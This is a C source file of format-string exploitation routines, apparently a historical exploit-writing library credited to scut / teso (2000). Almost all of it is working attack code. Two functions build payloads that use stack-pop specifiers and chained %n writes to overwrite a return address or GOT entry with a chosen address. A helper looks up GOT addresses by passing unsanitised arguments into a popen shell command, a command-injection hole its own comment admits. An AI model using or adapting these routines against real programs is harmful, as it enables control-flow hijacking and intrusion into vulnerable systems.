/* format string exploitation routines
 *
 * by scut / teso
 *
 * 2000/10/01  first version
 * 2000/10/08  added xp_fmt_direct function, cleanup
 *
 */

#include <sys/types.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "fmtxp.h"

#define	VERSION	"0.0.2 2000/10/08"


/* xp_fmt_simple
 *
 * the simplest case of format exploitation with fixed offsets and
 * a large source and destination buffer.
 *
 * distance   the distance in bytes between the current esp and the begining
 *            of this string (the first byte this function writes)
 * retloc     return address location, the address where the return address
 *            is stored that we want to overwrite (or GOT address of say,
 *            exit())
 * retaddr    the return address we want to return to
 * written    the number of bytes already written by the printf function,
 *            if you supply the whole source string it is usually zero
 *
 * dest       where we construct the string
 * dest_len   space available
 *
 * return number of bytes used
 *  -1 on error
 *
 * buffer layout
 *
 * [padding][rl0][dm1][rl1][dm2][rl2][dm3][rl3][stackpop][write]
 *
 * or (if distance is < 4):
 *
 * [padding][dm0][rl0][dm1][rl1][dm2][rl2][dm3][rl3][stackpop][write]
 *
 *
 */

int
xp_fmt_simple (int distance, unsigned long retloc, unsigned long retaddr,
	int written, unsigned char *dest, size_t dest_len)
{
	int		i;
	int		tow,
			rdist;
	unsigned char *	dest_orig = dest;
	unsigned char	ra[4];
	int		distfac,	/* distance we can pop */
			distrem;	/* alignment distance */


	/* uprounding of distance
	 */
	rdist = (distance / 4);
	rdist *= 4;

	/* calculate distance values
	 */
	distfac = (rdist / 4);
	distrem = (4 - (distance - rdist)) % 4;

	if (distrem != 0)
		distfac += 1;


	memset (dest, '\x00', dest_len);

	if ((strlen ("%10u") * distfac + distrem +
		((distfac == 0) ? 32 : 28)) >= (dest_len - 1))
		return (-1);

	for (; distrem > 0 ; --distrem) {
		strcat (dest, "x");
		written += 1;
	}
	dest += strlen (dest);


	/* create retloc/dummy pairs
	 */

	/* if there is no dummy value we can use, then we have to fill in one,
	 * doh!
	 */
	if (distfac == 0) {
		dest[0] = 'a';
		dest[1] = 'a';
		dest[2] = 'a';
		dest[3] = 'a';
		dest += 4;
		written += 4;
	} else {
		distfac -= 1;
	}

	for (i = 0 ; i <= 3 ; ++i) {
		STOR_QUAD (dest, retloc);
		STOR_QUAD (dest + 4, 0x73507350);
		dest += 8;

		retloc += 1;	/* shift */
		written += 8;
	}

	/* correct data
	 */
	dest_len -= (distfac == 0) ? 32 : 28;
	dest -= 4;
	written -= 4;
	memset (dest, '\x00', dest_len);

	/* now do the stackpop
	 */
	do {
		strcat (dest, "%10u");
		distfac -= 1;
		dest_len -= strlen ("%10u");
		written += 10;
	} while (distfac > 0);

	/* and the famous four time combo write
	 */

	/* prepare retaddr for write
	 */
	STOR_QUAD (ra, retaddr);

	if (dest_len <= (4 * strlen ("%000d%n") + 1))
		return (-1);

	tow = TOWCALC (ra[0], written);
	sprintf (dest + strlen (dest), "%%%dd%%n", tow);
	written += tow;
	tow = TOWCALC (ra[1], written);
	sprintf (dest + strlen (dest), "%%%dd%%n", tow);
	written += tow;
	tow = TOWCALC (ra[2], written);
	sprintf (dest + strlen (dest), "%%%dd%%n", tow);
	written += tow;
	tow = TOWCALC (ra[3], written);
	sprintf (dest + strlen (dest), "%%%dd%%n", tow);

	dest += strlen (dest);

	return (dest - dest_orig);
}


/* xp_fmt_direct
 *
 * an even more direct format string exploitation method, first seen
 * in irx_telnetd.c by LSD, later improved by caddis and lorian.
 *
 * buffer layout:
 *
 * [p1][w1][p2][w2][p3][w3][p4][w4]
 *
 * where p_n_ is of the form: %...u
 * and w_n_ looks like: %...$n
 *
 * `distance' is the distance on the stack to a user supplied buffer
 * which has to look like [a1][a2][a3][a4], where a_n_ is retloc + n.
 * the padding has to be done by the caller, this function only does
 * the complicated format stuff. `distance' is given in bytes, but the
 * lower 2 bits are cleared (div 4).
 *
 * return number of bytes written on success
 * return -1 on failure
 *
 * btw, this method does NOT work on most BSD libc based systems, but it
 * works fine on GNU libc and irix libc (although it's bsd based), though
 * for irix this function doesn't work because it is for little endian
 * system. mips is so nice.
 */

int
xp_fmt_direct (int distance, unsigned long retaddr,
	int written, unsigned char *dest, size_t dest_len)
{
	int		tow;
	char		wrprep[4][32];
	unsigned char	ra[4];


	/* prepare data
	 */
	distance /= 4;
	STOR_QUAD (ra, retaddr);
	memset (dest, '\x00', dest_len);
	memset (wrprep, '\x00', sizeof (wrprep));

	/* do quad write
	 */
	tow = TOWCALC (ra[0], written);
	sprintf (wrprep[0], "%%%du%%%d$n", tow, distance);
	written += tow;
	tow = TOWCALC (ra[1], written);
	sprintf (wrprep[1], "%%%du%%%d$n", tow, distance + 1);
	written += tow;
	tow = TOWCALC (ra[2], written);
	sprintf (wrprep[2], "%%%du%%%d$n", tow, distance + 2);
	written += tow;
	tow = TOWCALC (ra[3], written);
	sprintf (wrprep[3], "%%%du%%%d$n", tow, distance + 3);
	written += tow;

	if (dest_len < (strlen (wrprep[0]) + strlen (wrprep[1]) +
		strlen (wrprep[2]) + strlen (wrprep[3]) + 1))
	{
		return (-1);
	}

	return (sprintf (dest, "%s%s%s%s", wrprep[0], wrprep[1], wrprep[2],
		wrprep[3]));
}



/* xp_got_retrieve
 *
 * look up the GOT table address of the function with the name `name' in the
 * readable binary pointed to by `pathname'.
 *
 * return 0 on failure
 * return address on success
 *
 * inspired by some exploit sources, i cannot remember whom wrote it,
 * mhh... maybe it was scrippie ?
 *
 * FIXME: this function assumes proper arguments, which do not contain any
 *        nasty things such as |;>< and the like.
 */

unsigned long int
xp_got_retrieve (char *pathname, char *name)
{
	FILE *			pres;
	char			pbuff[512];
	unsigned long int	addr;

	memset (pbuff, '\x00', sizeof (pbuff));
	snprintf (pbuff, sizeof (pbuff), "objdump --dynamic-reloc %s |"
		"grep %s|cut -d ' ' -f1", pathname, name);
	pbuff[sizeof (pbuff) - 1] = '\x00';

	pres = popen (pbuff, "r");
	if (pres == NULL)
		return (0);

	if (fscanf (pres, "%08lx", &addr) != 1)
		return (0);

	return (addr);
}

